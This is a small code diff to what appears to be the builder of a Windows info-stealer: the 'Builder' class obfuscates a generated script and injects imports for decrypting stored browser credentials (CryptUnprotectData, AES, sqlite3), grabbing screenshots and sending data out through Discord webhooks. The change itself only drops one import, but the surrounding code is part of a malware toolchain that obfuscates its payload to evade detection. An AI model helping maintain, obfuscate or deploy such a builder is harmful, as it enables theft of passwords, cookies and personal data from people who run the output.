@@ -241,7 +241,7 @@ class Builder:
     def encryption(self, filename):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
 
-        imports = "\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64, ctypes;from tkinter import messagebox;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"
+        imports = "\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64;from tkinter import messagebox;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"
         
         os.system(f"python obfuscation.py {filename}.py")
         with open(f"obfuscated_{filename}.py", "a") as f:
